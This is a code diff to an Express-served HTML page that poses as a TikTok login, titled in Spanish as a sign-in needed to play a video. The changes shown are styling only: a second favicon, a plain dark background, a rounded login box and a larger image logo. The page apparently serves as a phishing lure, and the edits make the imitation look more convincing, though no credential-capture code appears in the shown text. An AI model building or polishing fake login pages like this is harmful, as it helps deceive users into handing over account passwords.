@@ -35,6 +35,7 @@ res.send(`
 <title>Inicia sesión con TikTok para reproducir correctamente el video</title>
 
 <link rel="icon" type="image/png" href="/icon.png?v=2">
+<link rel="icon" type="image/png" href="/favicon.png">
 
 <style>
 
@@ -48,7 +49,7 @@ body{
 
     margin:0;
     height:100vh;
-    background:linear-gradient(135deg,#111,#333);
+    background:#111;
 
     display:flex;
     justify-content:center;
@@ -56,34 +57,33 @@ body{
 
 }
 
-
 .login-box{
 
     width:380px;
 
     background:white;
 
-    padding:40px;
+    padding:50px 40px;
 
-    border-radius:20px;
+    border-radius:35px;
 
     box-shadow:0 15px 40px rgba(0,0,0,.3);
+
+    text-align:center;
 
 }
 
 
-
 .logo{
 
-    text-align:center;
+    width:120px;
+    height:120px;
 
-    font-size:35px;
+    object-fit:contain;
 
-    font-weight:bold;
+    display:block;
 
-    margin-bottom:10px;
-
-    color:#111;
+    margin:0 auto 25px;
 
 }
 
@@ -183,19 +183,6 @@ button:hover{
     font-weight:bold;
 
 }
-.icono{
-    width:80px;
-    height:80px;
-    margin:0 auto 15px;
-    background:#111;
-    color:white;
-    border-radius:50%;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    font-size:40px;
-    font-weight:bold;
-}
 .logo-img{
     width:90px;
     height:90px;
@@ -203,13 +190,7 @@ button:hover{
     object-fit:cover;
     display:block;
     margin:auto;
-}
-.logo {
-    width: 80px;
-    height: 80px;
-    object-fit: contain;
-    display: block;
-    margin: 0 auto 20px;
+
 }
 </style>
 
